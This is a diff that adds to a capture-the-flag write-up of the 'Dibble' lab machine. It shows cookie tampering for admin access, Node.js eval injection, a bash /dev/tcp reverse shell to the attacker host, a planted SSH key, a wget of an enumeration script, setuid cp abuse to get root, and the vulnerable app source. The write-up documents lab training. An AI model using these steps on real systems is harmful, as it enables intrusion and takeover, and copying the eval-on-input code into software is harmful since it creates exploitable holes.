@@ -826,6 +826,699 @@ That application lets you register! Inspect the traffic carefully.
 
 Hopefully you noticed what kind of application this is... And it literally asks for RCE!
 
+Just used the writeup
+
+### Change Cookie
+
+![](Pasted%20image%2020220309181036.png)
+
+![](Pasted%20image%2020220309181048.png)
+
+![](Pasted%20image%2020220309181147.png)
+
+![](Pasted%20image%2020220309181137.png)
+
+## RCE
+
+![](Pasted%20image%2020220309181338.png)
+
+![](Pasted%20image%2020220309181328.png)
+
+## Linux Commands
+
+```javascript
+const { exec } = require("child_process");
+
+exec("ls /usr/bin | grep python", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+```
+
+![](Pasted%20image%2020220309181639.png)
+
+```javascript
+const { exec } = require("child_process");
+
+JSON.stringify(exec("ls /usr/bin | grep python", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+}));
+```
+
+![](Pasted%20image%2020220309181738.png)
+
+## Reverse Shell
+
+```javascript
+const { exec } = require("child_process");
+exec("/bin/bash -i >& /dev/tcp/192.168.49.106/3000 0>&1", (error, stdout, stderr) => {});
+```
+
+![](Pasted%20image%2020220309182015.png)
+
+```bash
+┌──(kali㉿kali)-[/tmp]
+└─$ nc -nlvp 3000                                                                                                                                                   1 ⨯
+listening on [any] 3000 ...
+connect to [192.168.49.106] from (UNKNOWN) [192.168.106.110] 45566
+bash: cannot set terminal process group (935): Inappropriate ioctl for device
+bash: no job control in this shell
+[benjamin@dibble app]$ whoami
+whoami
+benjamin
+[benjamin@dibble app]$ pwd
+pwd
+/home/benjamin/app
+[benjamin@dibble app]$ ls
+ls
+app.js
+bin
+node_modules
+package.json
+package-lock.json
+public
+routes
+server.sh
+utils
+views
+[benjamin@dibble app]$ cd ..
+cd ..
+[benjamin@dibble ~]$ ls -al
+ls -al
+total 36
+drwx------. 5 benjamin benjamin 4096 Sep 23  2020 .
+drwxr-xr-x. 3 root     root     4096 Sep 23  2020 ..
+drwxrwxr-x. 8 benjamin benjamin 4096 Sep 29  2020 app
+-rw-------. 1 benjamin benjamin    0 Sep 29  2020 .bash_history
+-rw-r--r--. 1 benjamin benjamin   18 Jun  2  2020 .bash_logout
+-rw-r--r--. 1 benjamin benjamin  141 Jun  2  2020 .bash_profile
+-rw-r--r--. 1 benjamin benjamin  376 Jun  2  2020 .bashrc
+drwx------. 3 benjamin benjamin 4096 Sep 23  2020 .config
+-rwx------. 1 benjamin root       33 Mar  9 08:38 local.txt
+drwxr-xr-x. 5 benjamin benjamin 4096 Sep 29  2020 .npm
+[benjamin@dibble ~]$ cat local.txt
+cat local.txt
+9a42e912e32ef8b913d63f5aa89a82c2
+[benjamin@dibble ~]$ ifconfig
+ifconfig
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.106.110  netmask 255.255.255.0  broadcast 192.168.106.255
+        inet6 fe80::cedc:c1fb:35a:33bc  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:ba:b1:77  txqueuelen 1000  (Ethernet)
+        RX packets 1077  bytes 113916 (111.2 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 745  bytes 950674 (928.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 7513  bytes 837523 (817.8 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7513  bytes 837523 (817.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[benjamin@dibble ~]$ 
+```
+
+![](Pasted%20image%2020220309181943.png)
+
+## SSH Fail
+```bash
+[benjamin@dibble ~]$ mkdir .ssh
+mkdir .ssh
+[benjamin@dibble ~]$ cd .ssh
+cd .ssh
+[benjamin@dibble .ssh]$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > authorized_keys
+<9dpSvHGLoEjaNnOsPW7hM= kali@kali" > authorized_keys
+[benjamin@dibble .ssh]$ 
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat .ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ ssh -i ~/.ssh/id_rsa benjamin@192.168.106.110                                                                
+The authenticity of host '192.168.106.110 (192.168.106.110)' can't be established.
+ECDSA key fingerprint is SHA256:h/BniqXV9UI141QtRam9L8CcyIvnad0eIFX+Y02cYR8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.106.110' (ECDSA) to the list of known hosts.
+benjamin@192.168.106.110's password: 
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$
+```
+
 # Privilege Escalation
 
+```bash
+[benjamin@dibble ~]$ cd /tmp
+cd /tmp
+[benjamin@dibble tmp]$ wget 192.168.49.106:3000/lse.sh
+wget 192.168.49.106:3000/lse.sh
+--2022-03-09 10:23:29--  http://192.168.49.106:3000/lse.sh
+Connecting to 192.168.49.106:3000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 43570 (43K) [text/x-sh]
+Saving to: ‘lse.sh’
+
+     0K .......... .......... .......... .......... ..        100%  104K=0.4s
+
+2022-03-09 10:23:30 (104 KB/s) - ‘lse.sh’ saved [43570/43570]
+
+[benjamin@dibble tmp]$ chmod +x lse.sh
+chmod +x lse.sh
+[benjamin@dibble tmp]$ ./lse.sh
+./lse.sh
+---
+If you know the current user password, write it here to check sudo privileges:                                                                                          
+---
+                                                                                                                                                                        
+ LSE Version: 3.7                                                                                                                                                       
+
+        User: benjamin
+     User ID: 1000
+    Password: none
+        Home: /home/benjamin
+        Path: /home/benjamin/.local/bin:/home/benjamin/bin:/usr/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/home/benjamin/app/node_modules/.bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+       umask: 0002
+
+    Hostname: dibble
+       Linux: 5.8.10-200.fc32.x86_64
+Distribution: Fedora 32 (Thirty Two)
+Architecture: x86_64
+
+==================================================================( users )=====
+[i] usr000 Current user groups............................................. yes!
+[*] usr010 Is current user in an administrative group?..................... nope
+[*] usr020 Are there other users in administrative groups?................. nope
+[*] usr030 Other users with shell.......................................... yes!
+[i] usr040 Environment information......................................... skip
+[i] usr050 Groups for other users.......................................... skip                                                                                        
+[i] usr060 Other users..................................................... skip                                                                                        
+[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
+[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
+===================================================================( sudo )=====
+[!] sud000 Can we sudo without a password?................................. nope
+[!] sud010 Can we list sudo commands without a password?................... nope
+[*] sud040 Can we read sudoers files?...................................... nope
+[*] sud050 Do we know if any other users used sudo?........................ nope
+============================================================( file system )=====
+[*] fst000 Writable files outside user's home.............................. yes!
+[*] fst010 Binaries with setuid bit........................................ yes!
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+/usr/bin/cp
+---
+[!] fst030 Can we write to any setuid binary?.............................. nope
+[*] fst040 Binaries with setgid bit........................................ skip
+[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
+[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
+[*] fst070 Can we read /root?.............................................. nope                                                                                        
+[*] fst080 Can we read subdirectories under /home?......................... nope
+[*] fst090 SSH files in home directories................................... yes!
+[*] fst100 Useful binaries................................................. yes!
+[*] fst110 Other interesting files in home directories..................... nope
+[!] fst120 Are there any credentials in fstab/mtab?........................ nope
+[*] fst130 Does 'benjamin' have mail?...................................... yes!
+[!] fst140 Can we access other users mail?................................. nope
+[*] fst150 Looking for GIT/SVN repositories................................ nope
+[!] fst160 Can we write to critical files?................................. nope
+[!] fst170 Can we write to critical directories?........................... nope
+[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+[!] fst190 Can we read any backup?......................................... nope
+[!] fst200 Are there possible credentials in any shell history file?....... nope
+[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
+[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
+[i] fst500 Files owned by user 'benjamin'.................................. skip
+[i] fst510 SSH files anywhere.............................................. skip                                                                                        
+[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
+[i] fst530 List NFS server shares.......................................... skip                                                                                        
+[i] fst540 Dump fstab file................................................. skip                                                                                        
+=================================================================( system )=====                                                                                        
+[i] sys000 Who is logged in................................................ skip
+[i] sys010 Last logged in users............................................ skip                                                                                        
+[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
+[!] sys022 Does the /etc/group have hashes?................................ nope
+[!] sys030 Can we read shadow files?....................................... nope
+[*] sys040 Check for other superuser accounts.............................. nope
+[*] sys050 Can root user log in via SSH?................................... nope
+[i] sys060 List available shells........................................... skip
+[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
+[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
+===============================================================( security )=====                                                                                        
+[*] sec000 Is SELinux present?............................................. yes!
+[*] sec010 List files with capabilities.................................... yes!
+[!] sec020 Can we write to a binary with caps?............................. nope
+[!] sec030 Do we have all caps in any binary?.............................. nope
+[*] sec040 Users with associated capabilities.............................. nope
+[!] sec050 Does current user have capabilities?............................ skip
+[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
+========================================================( recurrent tasks )=====
+[*] ret000 User crontab.................................................... nope
+[!] ret010 Cron tasks writable by user..................................... nope
+[*] ret020 Cron jobs....................................................... nope
+[*] ret030 Can we read user crontabs....................................... nope
+[*] ret040 Can we list other user cron tasks?.............................. nope
+[*] ret050 Can we write to any paths present in cron jobs.................. nope
+[!] ret060 Can we write to executable paths present in cron jobs........... skip
+[i] ret400 Cron files...................................................... skip                                                                                        
+[*] ret500 User systemd timers............................................. nope                                                                                        
+[!] ret510 Can we write in any system timer?............................... nope
+[i] ret900 Systemd timers.................................................. skip
+================================================================( network )=====                                                                                        
+[*] net000 Services listening only on localhost............................ yes!
+[!] net010 Can we sniff traffic with tcpdump?.............................. nope
+[i] net500 NIC and IP information.......................................... skip
+[i] net510 Routing table................................................... skip                                                                                        
+[i] net520 ARP table....................................................... skip                                                                                        
+[i] net530 Nameservers..................................................... skip                                                                                        
+[i] net540 Systemd Nameservers............................................. skip                                                                                        
+[i] net550 Listening TCP................................................... skip                                                                                        
+[i] net560 Listening UDP................................................... skip                                                                                        
+===============================================================( services )=====                                                                                        
+[!] srv000 Can we write in service files?.................................. nope
+[!] srv010 Can we write in binaries executed by services?.................. nope
+[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
+[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
+[*] srv040 Upstart files not belonging to root............................. nope
+[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
+[i] srv400 Contents of /etc/inetd.conf..................................... skip
+[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
+[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
+[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
+[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
+[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
+[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
+[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
+[!] srv510 Can we write in binaries executed by systemd services?.......... nope
+[*] srv520 Systemd files not belonging to root............................. nope
+[i] srv900 Systemd config files permissions................................ skip
+===============================================================( software )=====                                                                                        
+[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+[!] sof010 Can we connect to MySQL as root without password?............... nope
+[!] sof015 Are there credentials in mysql_history file?.................... nope
+[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+[*] sof030 Installed apache modules........................................ yes!
+[!] sof040 Found any .htpasswd files?...................................... nope
+[!] sof050 Are there private keys in ssh-agent?............................ nope
+[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
+[!] sof070 Can we write to a ssh-agent socket?............................. nope
+[!] sof080 Can we write to a gpg-agent socket?............................. nope
+[!] sof090 Found any keepass database files?............................... nope
+[!] sof100 Found any 'pass' store directories?............................. nope
+[!] sof110 Are there any tmux sessions available?.......................... nope
+[*] sof120 Are there any tmux sessions from other users?................... nope
+[!] sof130 Can we write to tmux session sockets from other users?.......... nope
+[!] sof140 Are any screen sessions available?.............................. nope
+[*] sof150 Are there any screen sessions from other users?................. nope
+[!] sof160 Can we write to screen session sockets from other users?........ nope
+[i] sof500 Sudo version.................................................... skip
+[i] sof510 MySQL version................................................... skip                                                                                        
+[i] sof520 Postgres version................................................ skip                                                                                        
+[i] sof530 Apache version.................................................. skip                                                                                        
+[i] sof540 Tmux version.................................................... skip                                                                                        
+[i] sof550 Screen version.................................................. skip                                                                                        
+=============================================================( containers )=====                                                                                        
+[*] ctn000 Are we in a docker container?................................... nope
+[*] ctn010 Is docker available?............................................ nope
+[!] ctn020 Is the user a member of the 'docker' group?..................... nope
+[*] ctn200 Are we in a lxc container?...................................... nope
+[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
+==============================================================( processes )=====
+[i] pro000 Waiting for the process monitor to finish....................... yes!
+[i] pro001 Retrieving process binaries..................................... yes!
+[i] pro002 Retrieving process users........................................ yes!
+[!] pro010 Can we write in any process binary?............................. nope
+[*] pro020 Processes running with root permissions......................... yes!
+[*] pro030 Processes running by non-root users with shell.................. yes!
+[i] pro500 Running processes............................................... skip
+[i] pro510 Running process binaries and permissions........................ skip                                                                                        
+                                                                                                                                                                        
+==================================( FINISHED )==================================                                                                                        
+[benjamin@dibble tmp]$ cp /bin/bash /bash
+cp /bin/bash /bash
+[benjamin@dibble tmp]$ ls -al /bash
+ls -al /bash
+-rwxr-xr-x 1 root benjamin 1224424 Mar  9 10:24 /bash
+[benjamin@dibble tmp]$ 
+[benjamin@dibble tmp]$ cp --attributes-only --preserve=all /usr/bin/cp /bash
+< --attributes-only --preserve=all /usr/bin/cp /bash
+bash: └─$: command not found
+[benjamin@dibble tmp]$ cp --attributes-only --preserve=all /usr/bin/cp /bash
+cp --attributes-only --preserve=all /usr/bin/cp /bash
+[benjamin@dibble tmp]$ ls -al /bash
+ls -al /bash
+-rwsr-xr-x. 1 root root 1224424 Apr 23  2020 /bash
+[benjamin@dibble tmp]$ /bash -p
+/bash -p
+cd /root
+ls
+proof.txt
+cat proof.txt
+6c6b007a7280b1e16efcf0cd07125c44
+ifconfig
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.106.110  netmask 255.255.255.0  broadcast 192.168.106.255
+        inet6 fe80::cedc:c1fb:35a:33bc  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:ba:b1:77  txqueuelen 1000  (Ethernet)
+        RX packets 1251  bytes 173817 (169.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 889  bytes 983540 (960.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 7981  bytes 884791 (864.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7981  bytes 884791 (864.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+```
+
+![](Pasted%20image%2020220309182612.png)
+
 # Others
+
+Analysing code
+
+```javascript
+[benjamin@dibble ~]$ ls
+ls
+app
+local.txt
+[benjamin@dibble ~]$ cd app
+cd app
+[benjamin@dibble app]$ ls
+ls
+app.js
+bin
+node_modules
+package.json
+package-lock.json
+public
+routes
+server.sh
+utils
+views
+[benjamin@dibble app]$ cat server.sh
+cat server.sh
+#!/bin/bash
+cd /home/benjamin/app
+npm start app.js
+[benjamin@dibble app]$ cd views
+cd views
+[benjamin@dibble views]$ ls
+ls
+account.hbs
+alllogs.hbs
+error.hbs
+index.hbs
+layout.hbs
+login.hbs
+newlogs.hbs
+partials
+public-profile.hbs
+register.hbs
+[benjamin@dibble views]$ cat newlogs.hbs
+cat newlogs.hbs
+<h2>Register a new log event</h2>
+
+{{> messages }}
+
+<form action="/logs/new" method="POST">
+  <div class="form-group">
+    <label for="username">Username of the issue:</label>
+    <input type="text" class="form-control" name="username" id="username">
+  </div>
+  <div class="form-group">
+    <label for="message">Event Message (add technical details/code if required):</label>
+    <textarea type="textarea" class="form-control" name="msg" id="msg" cols="30" rows="10"></textarea>
+  </div>
+  <button class="btn btn-primary">Register</button>
+</form>
+[benjamin@dibble views]$ cd ../
+cd ../
+[benjamin@dibble app]$ cd utils
+cd utils
+[benjamin@dibble utils]$ ls
+ls
+auth.js
+[benjamin@dibble utils]$ cat auth.js
+cat auth.js
+// Create password hash util
+// --------------------------------------------------
+const crypto = require('crypto');
+
+const hashPassword = (plainText) => {
+  return crypto.createHmac('sha256', 'secret key')
+    .update(plainText)
+    .digest('hex');
+}
+// --------------------------------------------------
+
+module.exports = { hashPassword };[benjamin@dibble utils]$ cd ..
+cd ..
+[benjamin@dibble app]$ cat app.js
+cat app.js
+var createError = require('http-errors');
+var express = require('express');
+var path = require('path');
+var cookieParser = require('cookie-parser');
+var logger = require('morgan');
+
+// New stuff to add
+//---------------------------------------------------
+const hbs = require('hbs');
+const MongoClient = require('mongodb').MongoClient;
+const passport = require('passport');
+const Strategy = require('passport-local').Strategy;
+const authUtils = require('./utils/auth');
+const session = require('express-session');
+const flash = require('connect-flash');
+// --------------------------------------------------
+
+var indexRouter = require('./routes/index');
+var usersRouter = require('./routes/users');
+var logsRouter = require('./routes/logs');
+
+// Add new routes
+// --------------------------------------------------
+const authRouter = require('./routes/auth');
+// --------------------------------------------------
+
+var app = express();
+
+// Connect to db
+// --------------------------------------------------
+MongoClient.connect('mongodb://localhost', (err, client) => {
+  if (err) {
+    throw err;
+  }
+
+  const db = client.db('account-app');
+  const users = db.collection('users');
+  const logmsg = db.collection('logmsg');
+  app.locals.users = users;
+  app.locals.logmsg = logmsg;
+});
+// --------------------------------------------------
+
+
+// Configure passport
+// --------------------------------------------------
+passport.use(new Strategy(
+  (username, password, done) => {
+    app.locals.users.findOne({ username }, (err, user) => {
+      if (err) {
+        return done(err);
+      }
+
+      if (!user) {
+        return done(null, false);
+      }
+
+      if (user.password != authUtils.hashPassword(password)) {
+        return done(null, false);
+      }
+
+      return done(null, user);
+    });
+  }
+));
+
+passport.serializeUser((user, done) => {
+  done(null, user._id);
+});
+
+passport.deserializeUser((id, done) => {
+  done(null, { id });
+});
+// --------------------------------------------------
+
+
+// view engine setup
+app.set('views', path.join(__dirname, 'views'));
+app.set('view engine', 'hbs');
+
+// Set partials for handlebars
+// --------------------------------------------------
+hbs.registerPartials(path.join(__dirname, 'views/partials'));
+// --------------------------------------------------
+
+app.use(logger('dev'));
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(cookieParser());
+app.use(express.static(path.join(__dirname, 'public')));
+
+
+// Configure session, passport, flash
+// --------------------------------------------------
+app.use(session({
+  secret: 'session secret',
+  resave: false,
+  saveUninitialized: false,
+}));
+
+app.use(passport.initialize());
+app.use(passport.session());
+app.use(flash());
+
+app.use((req, res, next) => {
+  res.locals.loggedIn = req.isAuthenticated();
+  next();
+});
+// --------------------------------------------------
+
+app.use('/', indexRouter);
+app.use('/users', usersRouter);
+app.use('/logs', logsRouter);
+
+// Add new routes
+// --------------------------------------------------
+app.use('/auth', authRouter);
+// --------------------------------------------------
+
+// catch 404 and forward to error handler
+app.use(function(req, res, next) {
+  next(createError(404));
+});
+
+// error handler
+app.use(function(err, req, res, next) {
+  // set locals, only providing error in development
+  res.locals.message = err.message;
+  res.locals.error = req.app.get('env') === 'development' ? err : {};
+
+  // render the error page
+  res.status(err.status || 500);
+  res.render('error');
+});
+
+module.exports = app;
+[benjamin@dibble app]$ cd routes
+cd routes
+[benjamin@dibble routes]$ ls
+ls
+auth.js
+index.js
+logs.js
+users.js
+[benjamin@dibble routes]$ cat logs.js
+cat logs.js
+const express = require('express');
+const router = express.Router();
+const authUtils = require('../utils/auth');
+const passport = require('passport');
+const flash = require('connect-flash');
+
+// Create login page
+// --------------------------------------------------
+router.get('/', (req, res, next) => {
+  if (!req.isAuthenticated()) { 
+    res.redirect('/auth/login');
+  }
+  const messages = req.flash();
+  res.render('newlogs', { messages });
+});
+// --------------------------------------------------
+
+router.get('/all', (req, res, next) => {
+  const logmsg = req.app.locals.logmsg;
+  
+  logmsg.find({}).toArray(function(err, result) {
+    if (err) throw err;
+    console.log(result);
+    res.render('alllogs', { result });
+  });
+
+})
+
+// Handle register request
+// --------------------------------------------------
+router.post('/new', (req, res, next) => {
+  if (!req.isAuthenticated()) { 
+    res.redirect('/auth/login');
+  }
+  if (req.cookies['userLevel'] == Buffer.from("admin").toString('base64') ) {
+
+    const logsParams = req.body;
+    const logmsg = req.app.locals.logmsg;
+
+    try {
+      logsParams.msg = eval(logsParams.msg);
+    }
+    catch (e) {
+      req.flash('error', 'Message format not valid, try "using double quotes" (testing new feature)');
+    }
+
+    
+    const payload = {
+      username: logsParams.username,
+      msg: logsParams.msg,
+    };
+    
+    // Testing for future scripts and code suggestions
+    logmsg.insertOne(payload, (err) => {
+      if (err) {
+        req.flash('error', 'Something happened.');
+      } else {
+        req.flash('success', 'The event log has been updated');
+      }
+
+      res.redirect('/logs/all');
+    })
+  } else {
+        
+    req.flash('error', 'Only the admin can update the Event logs');
+    res.redirect('/logs');
+  }
+});
+
+// --------------------------------------------------
+module.exports = router;[benjamin@dibble routes]$ 
+
+```
